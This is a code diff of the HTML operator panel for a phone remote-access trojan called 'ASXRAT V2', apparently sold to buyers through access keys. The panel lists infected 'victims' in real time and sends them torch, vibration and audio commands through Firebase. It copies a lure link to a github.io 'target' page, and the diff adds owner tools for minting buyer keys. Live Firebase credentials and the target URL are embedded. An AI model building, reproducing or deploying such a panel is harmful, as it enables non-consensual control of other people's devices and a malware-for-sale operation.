@@ -3,15 +3,15 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>V-PROJECT MASTER CONTROL</title>
+    <title>ASXRAT V2</title>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
     <style>
         :root { --neon: #ffd700; --bg: #050505; --card: #111; }
         body { background: var(--bg); color: #fff; font-family: 'Courier New', monospace; margin: 0; padding: 0; }
         #auth { position: fixed; inset: 0; background: #000; z-index: 999; display: flex; flex-direction: column; justify-content: center; align-items: center; }
-        .card { border: 1px solid var(--neon); padding: 25px; border-radius: 15px; background: var(--card); width: 85%; max-width: 350px; text-align: center; box-shadow: 0 0 20px rgba(255, 215, 0, 0.2); }
-        input { width: 90%; padding: 12px; margin: 15px 0; background: #1a1a1a; border: 1px solid #444; color: var(--neon); text-align: center; border-radius: 8px; font-weight: bold; outline: none; }
+        .card { border: 1px solid var(--neon); padding: 25px; border-radius: 15px; background: var(--card); width: 85%; max-width: 350px; text-align: center; box-shadow: 0 0 15px var(--neon); }
+        input { width: 90%; padding: 12px; margin: 10px 0; background: #1a1a1a; border: 1px solid #444; color: var(--neon); text-align: center; border-radius: 8px; font-weight: bold; outline: none; }
         #dash { display: none; padding: 20px; max-width: 500px; margin: auto; }
         .target-card { background: var(--card); border: 1px solid #333; padding: 15px; margin-bottom: 15px; border-radius: 10px; border-left: 5px solid var(--neon); }
         .btn-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 8px; margin-top: 12px; }
@@ -23,7 +23,7 @@
 
     <div id="auth">
         <div class="card">
-            <h2 style="color:var(--neon); margin:0;">V-PROJECT V12</h2>
+            <h2 style="color:var(--neon); margin:0;">ASXRAT V2</h2>
             <input type="password" id="key-input" placeholder="INPUT ACCESS KEY...">
             <button onclick="login()" class="btn-main">LOGIN RAT</button>
         </div>
@@ -34,27 +34,29 @@
             <b id="user-display" style="color:var(--neon)">USER: ...</b><br>
             <button class="btn-main" onclick="salinLink()">📋 SALIN LINK TARGET GUA</button>
             <div id="owner-tools" style="display:none; margin-top:15px; border-top:1px solid #333; padding-top:15px;">
-                <button onclick="buatKey()" style="background:#00ff00; width:100%; border:none; padding:10px; border-radius:5px; font-weight:bold;">+ CETAK KEY BUYER</button>
+                <input type="text" id="custom-key" placeholder="KETIK KEY CUSTOM...">
+                <button onclick="buatKey()" style="background:#00ff00; width:100%; border:none; padding:10px; border-radius:5px; font-weight:bold; color:#000;">CREATE & COPY KEY</button>
             </div>
         </div>
-        <h4 style="color:var(--neon)">VICTIM LIST (REAL-TIME):</h4>
+        <h4 style="color:var(--neon)">LIST TARGET:</h4>
         <div id="list"></div>
     </div>
 
 <script>
-    // === TEMPEL CONFIG FIREBASE DI SINI ===
+    // GANTI PAKE LINK WEB TARGET LU
     const linkWebTarget = "https://elvoxi.github.io/newcallingelvoxianjaikwkw/target.html"; 
+
+    // FIREBASE CONFIG LU SUDAH TERPASANG TOTAL
     const firebaseConfig = {
-  apiKey: "AIzaSyAddYZVOXibzxIWNTNwqqQn5n7QUrQN6ys",
-  authDomain: "rat-html.firebaseapp.com",
-  databaseURL: "https://rat-html-default-rtdb.asia-southeast1.firebasedatabase.app",
-  projectId: "rat-html",
-  storageBucket: "rat-html.firebasestorage.app",
-  messagingSenderId: "1060124583265",
-  appId: "1:1060124583265:web:7988dc574a1be9f10f5120",
-  measurementId: "G-SP76CHQ5XN"
-};
-    // ======================================
+      apiKey: "AIzaSyAddYZVOXibzxIWNTNwqqQn5n7QUrQN6ys",
+      authDomain: "rat-html.firebaseapp.com",
+      databaseURL: "https://rat-html-default-rtdb.asia-southeast1.firebasedatabase.app",
+      projectId: "rat-html",
+      storageBucket: "rat-html.firebasestorage.app",
+      messagingSenderId: "1060124583265",
+      appId: "1:1060124583265:web:a117830e798cd1d60f5120",
+      measurementId: "G-XMHT2S731L"
+    };
 
     firebase.initializeApp(firebaseConfig);
     const db = firebase.database();
@@ -67,12 +69,12 @@
             myKey = "OWNER"; amIOwner = true;
             document.getElementById('owner-tools').style.display = 'block';
             start();
-        } else if(val.startsWith("VPRJ-")) {
+        } else {
             db.ref('mario/all_keys/' + val).once('value', (s) => {
                 if(s.exists()) { myKey = val; amIOwner = false; start(); }
-                else alert("KEY GAK ADA DI DATABASE!");
+                else alert("KEY GAK VALID!");
             });
-        } else alert("FORMAT SALAH!");
+        }
     }
 
     function start() {
@@ -88,10 +90,10 @@
                 if(amIOwner || data.belongsTo === myKey) {
                     container.innerHTML += `
                         <div class="target-card">
-                            ${amIOwner ? `<small style="color:#555">BUYER: ${data.belongsTo}</small><br>` : ''}
-                            <b style="color:var(--neon)">${data.model}</b>
+                            <b style="color:var(--neon)">${data.model}</b> ${amIOwner ? `<br><small style="color:#555">KEY: ${data.belongsTo}</small>` : ''}
                             <div class="btn-grid">
-                                <button class="btn-rat" onclick="cmd('${child.key}', 'torch_on')">SENTER</button>
+                                <button class="btn-rat" onclick="cmd('${child.key}', 'torch_on')">SENTER ON</button>
+                                <button class="btn-rat" onclick="cmd('${child.key}', 'torch_off')">OFF</button>
                                 <button class="btn-rat" onclick="cmd('${child.key}', 'vibrate')">GETAR</button>
                                 <button class="btn-rat" onclick="cmd('${child.key}', 'play_audio')">SUARA</button>
                             </div>
@@ -101,18 +103,22 @@
         });
     }
 
-    function cmd(id, act) { db.ref(`mario/commands/${id}`).set({ action: act, time: Date.now() }); }
+    function cmd(id, act) { 
+        db.ref(`mario/commands/${id}`).set({ action: act, time: Date.now() }); 
+    }
+
+    function buatKey() {
+        let k = document.getElementById('custom-key').value;
+        if(!k) return alert("Isi dulu key-nya!");
+        db.ref('mario/all_keys/' + k).set({ created: Date.now() });
+        navigator.clipboard.writeText(k);
+        alert("KEY DIBUAT & DI-COPY: " + k);
+    }
+
     function salinLink() {
         const link = `${linkWebTarget}?key=${myKey}`;
-        const t = document.createElement('textarea'); t.value = link;
-        document.body.appendChild(t); t.select(); document.execCommand('copy');
-        document.body.removeChild(t);
+        navigator.clipboard.writeText(link);
         alert("Link Target Berhasil Disalin!");
-    }
-    function buatKey() {
-        const k = "VPRJ-" + Math.random().toString(36).substr(2, 6).toUpperCase();
-        db.ref('mario/all_keys/' + k).set({ created: Date.now() });
-        alert("KEY BARU: " + k);
     }
 </script>
 </body>
